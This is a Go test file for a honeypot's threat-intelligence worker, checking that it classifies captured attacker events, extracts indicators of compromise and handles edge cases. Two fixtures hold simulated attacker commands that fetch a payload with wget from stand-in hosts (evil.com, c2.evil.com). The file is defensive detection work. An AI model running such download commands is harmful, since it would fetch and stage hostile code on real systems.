package intelligence

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"slices"
	"sort"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// fakeDB is a minimal database.Database stub for worker tests.
type fakeDB struct {
	events         []*database.Event
	taggedCount    atomic.Int64
	iocCount       atomic.Int64
	ttpCount       atomic.Int64
	failTagEvent   bool
	storeMu        sync.Mutex
	checkpointData []byte
	iocRows        map[string]*database.IOC
	sessionRows    map[string]*database.TTPSession
}

func (f *fakeDB) Connect(ctx context.Context) error                             { return nil }
func (f *fakeDB) Close() error                                                  { return nil }
func (f *fakeDB) Ping(ctx context.Context) error                                { return nil }
func (f *fakeDB) InitializeSchema(ctx context.Context) error                    { return nil }
func (f *fakeDB) GetSchemaVersion(ctx context.Context) (int, error)             { return 1, nil }
func (f *fakeDB) SetSchemaVersion(ctx context.Context, v int) error             { return nil }
func (f *fakeDB) InsertEvent(ctx context.Context, e *database.Event) error      { return nil }
func (f *fakeDB) InsertEvents(ctx context.Context, evs []*database.Event) error { return nil }
func (f *fakeDB) GetEvents(ctx context.Context, filter database.EventFilter) ([]*database.Event, error) {
	return nil, nil
}
func (f *fakeDB) GetEventByID(ctx context.Context, id string) (*database.Event, error) {
	return nil, nil
}
func (f *fakeDB) GetStats(ctx context.Context, since time.Time) (*database.Stats, error) {
	return &database.Stats{}, nil
}
func (f *fakeDB) GetTopAttackers(ctx context.Context, limit int, since time.Time) ([]*database.AttackerStats, error) {
	return nil, nil
}
func (f *fakeDB) GetHoneypotStats(ctx context.Context, hp string, since time.Time) (*database.HoneypotStats, error) {
	return &database.HoneypotStats{}, nil
}
func (f *fakeDB) RetentionCleanup(ctx context.Context, olderThan time.Time) error   { return nil }
func (f *fakeDB) Optimize(ctx context.Context) error                                { return nil }
func (f *fakeDB) ExportData(ctx context.Context, s, e time.Time, w io.Writer) error { return nil }
func (f *fakeDB) ImportData(ctx context.Context, r io.Reader) error                 { return nil }
func (f *fakeDB) WithPool(pool *database.Pool) database.Database                    { return f }
func (f *fakeDB) GetPoolStats() database.PoolStats                                  { return database.PoolStats{} }
func (f *fakeDB) TagEvent(ctx context.Context, e *database.Event) error {
	if f.failTagEvent {
		return nil // silently ignore in production worker
	}
	f.taggedCount.Add(1)
	return nil
}
func (f *fakeDB) InsertIOC(ctx context.Context, ioc *database.IOC) error {
	f.iocCount.Add(1)
	return nil
}
func (f *fakeDB) InsertIOCs(ctx context.Context, iocs []*database.IOC) error {
	f.iocCount.Add(int64(len(iocs)))
	return nil
}
func (f *fakeDB) GetIOCs(ctx context.Context, filter database.IOCFilter) ([]*database.IOC, error) {
	f.storeMu.Lock()
	defer f.storeMu.Unlock()
	var rows []*database.IOC
	for _, row := range f.iocRows {
		if len(filter.Values) > 0 && !slices.Contains(filter.Values, row.Value) {
			continue
		}
		cp := *row
		rows = append(rows, &cp)
	}
	sort.Slice(rows, func(i, j int) bool { return rows[i].ID < rows[j].ID })
	if filter.Offset >= len(rows) {
		return nil, nil
	}
	rows = rows[filter.Offset:]
	if filter.Limit > 0 && len(rows) > filter.Limit {
		rows = rows[:filter.Limit]
	}
	return rows, nil
}

func (f *fakeDB) LoadIntelligenceCheckpoint(context.Context) (*database.IntelligenceCheckpoint, error) {
	f.storeMu.Lock()
	defer f.storeMu.Unlock()
	if len(f.checkpointData) == 0 {
		return nil, nil
	}
	var cp database.IntelligenceCheckpoint
	err := json.Unmarshal(f.checkpointData, &cp)
	return &cp, err
}

func (f *fakeDB) ReadIntelligenceIOCs(_ context.Context, wanted []*database.IOC) ([]*database.IOC, error) {
	f.storeMu.Lock()
	defer f.storeMu.Unlock()
	var rows []*database.IOC
	for _, key := range wanted {
		for _, row := range f.iocRows {
			if key.Type == row.Type && key.Value == row.Value && key.Honeypot == row.Honeypot {
				cp := *row
				rows = append(rows, &cp)
			}
		}
	}
	return rows, nil
}
func (f *fakeDB) SaveIntelligenceCheckpoint(_ context.Context, cp *database.IntelligenceCheckpoint) error {
	f.storeMu.Lock()
	defer f.storeMu.Unlock()
	if len(f.checkpointData) > 0 {
		var old database.IntelligenceCheckpoint
		if err := json.Unmarshal(f.checkpointData, &old); err != nil {
			return err
		}
		if old.Revision > cp.Revision {
			return nil
		}
	}
	data, err := json.Marshal(cp)
	if err != nil {
		return err
	}
	f.checkpointData = data
	return nil
}
func (f *fakeDB) ReplaceIntelligenceIOCs(_ context.Context, _ uint64, rows []*database.IOC) error {
	f.storeMu.Lock()
	defer f.storeMu.Unlock()
	if f.iocRows == nil {
		f.iocRows = make(map[string]*database.IOC)
	}
	for _, row := range rows {
		cp := *row
		f.iocRows[row.ID] = &cp
	}
	f.iocCount.Add(int64(len(rows)))
	return nil
}
func (f *fakeDB) ReplaceIntelligenceSessions(_ context.Context, _ uint64, rows []*database.TTPSession) error {
	f.storeMu.Lock()
	defer f.storeMu.Unlock()
	if f.sessionRows == nil {
		f.sessionRows = make(map[string]*database.TTPSession)
	}
	for _, row := range rows {
		cp := *row
		f.sessionRows[row.SessionID] = &cp
	}
	f.ttpCount.Add(int64(len(rows)))
	return nil
}
func (f *fakeDB) UpsertTTPSession(ctx context.Context, s *database.TTPSession) error {
	f.ttpCount.Add(1)
	return nil
}
func (f *fakeDB) GetTTPSessions(ctx context.Context, limit int) ([]*database.TTPSession, error) {
	return nil, nil
}
func (f *fakeDB) GetUnclassifiedEvents(ctx context.Context, limit int) ([]*database.Event, error) {
	if len(f.events) == 0 {
		return nil, nil
	}
	if limit > len(f.events) {
		limit = len(f.events)
	}
	out := make([]*database.Event, limit)
	copy(out, f.events[:limit])
	for i, e := range out {
		if e.ID == "" {
			e.ID = fmt.Sprint(i + 1)
		}
	}
	return out, nil
}

func newTestWorker(t *testing.T, db *fakeDB) *Worker {
	t.Helper()
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	ttpBuilder := NewTTPBuilder(30 * time.Minute)
	classifier := NewClassifier(loader, ttpBuilder)
	return NewWorker(classifier, db, 10*time.Second, 100)
}

// ---- basic worker ----

func TestWorkerClassifiesEvents(t *testing.T) {
	db := &fakeDB{
		events: []*database.Event{
			{Honeypot: "cowrie", EventType: "login_failed", SourceIP: "203.0.113.1", Timestamp: time.Now().UTC()},
			{Honeypot: "cowrie", EventType: "command", Command: "wget http://evil.com/x", SourceIP: "203.0.113.2", Timestamp: time.Now().UTC()},
		},
	}
	w := newTestWorker(t, db)
	n := w.runOnce(context.Background())
	if n != 2 {
		t.Errorf("runOnce classified %d events, want 2", n)
	}
	if db.taggedCount.Load() == 0 {
		t.Error("TagEvent should have been called for classified events")
	}
}

func TestWorkerInsertsIOCs(t *testing.T) {
	db := &fakeDB{
		events: []*database.Event{
			{
				Honeypot:  "cowrie",
				EventType: "command",
				Command:   "wget http://c2.evil.com/payload",
				SourceIP:  "203.0.113.5",
				Timestamp: time.Now().UTC(),
			},
		},
	}
	w := newTestWorker(t, db)
	w.runOnce(context.Background())
	if db.iocCount.Load() == 0 {
		t.Error("InsertIOC should have been called for the wget URL")
	}
}

func TestWorkerHandlesEmptyDB(t *testing.T) {
	db := &fakeDB{}
	w := newTestWorker(t, db)
	n := w.runOnce(context.Background())
	if n != 0 {
		t.Errorf("runOnce on empty DB returned %d, want 0", n)
	}
}

func TestWorkerNilTTPBuilder(t *testing.T) {
	// Classifier with nil ttpBuilder should not panic.
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	classifier := NewClassifier(loader, nil) // nil ttpBuilder
	db := &fakeDB{
		events: []*database.Event{
			{Honeypot: "cowrie", EventType: "login_failed", SourceIP: "203.0.113.1", Timestamp: time.Now().UTC()},
		},
	}
	w := NewWorker(classifier, db, 10*time.Second, 100)
	// Should not panic.
	w.runOnce(context.Background())
}

func TestWorkerContextCancellation(t *testing.T) {
	db := &fakeDB{}
	w := newTestWorker(t, db)

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // cancel immediately

	done := make(chan struct{})
	go func() {
		w.Run(ctx)
		close(done)
	}()

	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Error("worker.Run did not stop after context cancellation")
	}
}

// ---- stress ----

func TestWorkerStressLargeBatch(t *testing.T) {
	const eventCount = 5000
	events := make([]*database.Event, eventCount)
	for i := range events {
		events[i] = &database.Event{
			Honeypot:  "cowrie",
			EventType: "login_failed",
			Username:  "root",
			SourceIP:  "203.0.113.1",
			Timestamp: time.Now().UTC(),
		}
	}
	db := &fakeDB{events: events}
	w := newTestWorker(t, db)
	n := w.runOnce(context.Background())
	if n != 100 { // batch size is 100
		t.Errorf("runOnce should process batch of 100, got %d", n)
	}
	if db.taggedCount.Load() == 0 {
		t.Error("no events tagged in stress batch")
	}
}

func TestWorkerRepeatedRuns(t *testing.T) {
	events := []*database.Event{
		{Honeypot: "cowrie", EventType: "command", Command: "id", SourceIP: "203.0.113.1", Timestamp: time.Now().UTC()},
		{Honeypot: "cowrie", EventType: "login_failed", SourceIP: "203.0.113.2", Timestamp: time.Now().UTC()},
	}
	db := &fakeDB{events: events}
	w := newTestWorker(t, db)

	for i := 0; i < 50; i++ {
		w.runOnce(context.Background())
	}
	// Each run classifies the same events (fakeDB always returns the same slice).
	if db.taggedCount.Load() < 50 {
		t.Errorf("expected at least 50 TagEvent calls over 50 runs, got %d", db.taggedCount.Load())
	}
}

// TestWorkerZeroIntervalDoesNotPanic guards against the time.NewTicker(0)
// panic that crashed the server when a loaded config left worker_interval at
// its zero value.
func TestWorkerZeroIntervalDoesNotPanic(t *testing.T) {
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	classifier := NewClassifier(loader, NewTTPBuilder(30*time.Minute))

	// interval=0, batchSize=0 — both previously dangerous.
	w := NewWorker(classifier, &fakeDB{}, 0, 0)
	if w.interval <= 0 {
		t.Fatalf("interval not clamped: got %v", w.interval)
	}
	if w.batchSize <= 0 {
		t.Fatalf("batchSize not clamped: got %d", w.batchSize)
	}

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Run panicked with clamped interval: %v", r)
			}
			close(done)
		}()
		w.Run(ctx) // must not panic on NewTicker
	}()
	cancel()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Error("Run did not return after cancel")
	}
}

// tagTrackingDB behaves like a real backend: once an event is tagged it is no
// longer returned by GetUnclassifiedEvents.
type tagTrackingDB struct {
	fakeDB
	tagged map[*database.Event]bool
}

func (d *tagTrackingDB) TagEvent(ctx context.Context, e *database.Event) error {
	d.tagged[e] = true
	return nil
}

func (d *tagTrackingDB) GetUnclassifiedEvents(ctx context.Context, limit int) ([]*database.Event, error) {
	var out []*database.Event
	for _, e := range d.events {
		if !d.tagged[e] && len(out) < limit {
			out = append(out, e)
		}
	}
	return out, nil
}

// An event that matches no rule must still be marked processed; otherwise it is
// re-fetched forever and a full batch of such events starves newer ones.
func TestWorkerTagsUnmatchedEvents(t *testing.T) {
	unmatched := &database.Event{Honeypot: "cowrie", EventType: "session_closed",
		SourceIP: "203.0.113.9", Timestamp: time.Now().UTC()}
	db := &tagTrackingDB{fakeDB: fakeDB{events: []*database.Event{unmatched}},
		tagged: map[*database.Event]bool{}}
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	w := NewWorker(NewClassifier(loader, nil), db, 10*time.Second, 100)

	if n := w.runOnce(context.Background()); n != 1 {
		t.Fatalf("first run processed %d events, want 1", n)
	}
	if unmatched.TechniqueID != "" {
		t.Fatalf("test event unexpectedly matched rule %s", unmatched.TechniqueID)
	}
	if n := w.runOnce(context.Background()); n != 0 {
		t.Fatalf("second run re-processed %d events, want 0", n)
	}
}
